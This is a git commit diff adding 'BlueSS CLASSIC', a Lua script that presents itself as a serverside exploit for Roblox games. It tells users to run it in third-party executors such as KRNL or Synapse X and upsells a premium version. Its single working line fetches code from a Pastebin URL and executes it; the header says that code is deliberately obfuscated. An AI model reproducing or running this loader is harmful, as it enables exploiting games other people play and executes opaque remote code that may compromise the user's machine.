b695ad5155af8b9090f0c13f59353fff764bae7a
brokenpencil09 <92695919+lolz59@users.noreply.github.com>
2021-10-24 13:22:44 -0700

    Update and rename BlueSS.IMPORT.lua to BlueSS.CLASSIC.lua

---
+++ BlueSS.CLASSIC.lua
@@ -0,0 +1,35 @@
+--[[__  _             _____ _____ 
+|  _ \| |           / ____/ ____|
+| |_) | |_   _  ___| (___| (___  
+|  _ <| | | | |/ _ \\___ \\___ \ 
+| |_) | | |_| |  __/____) |___) |
+|____/|_|\__,_|\___|_____/_____/  CLASSIC
+
+-- Credits
+ > Made by bIue#2958
+ > Upgrade: https://sites.google.com/view/bluess
+
+-- Information
+ > Serverside/SS means the script / exploit is visible to everyone in the server.
+ > This will only run in an executor
+ > The script is obfuscated and impossible to edit! Upgrade to premium to get:
+	 > Open-source script (unobfuscated)
+	 > Available in workspace
+	 > Lots of settings
+	 > A lot more...
+
+-- Usage
+ > Get any executor (KRNL, Synapse X, etc.)
+ > Execute this script in any game
+ > Use it like any otner executor ]]
+
+-- Customization
+Theme = Color3.fromRGB(255, 255, 255) -- Chooses the color theme for the UI (RGB)
+UIFont = "Gotham" -- Chooses the font for the UI ("Font name")
+AutosetTheme = true -- Resets theme everytime executed if enabled (true/false)
+
+-- General
+Notifications = true -- Notifications show in console (Errors, successes, etc.) (true/false)
+
+-- Script (Only this line!)
+loadstring(game:HttpGet("https://pastebin.com/raw/TXerSEU7"))()
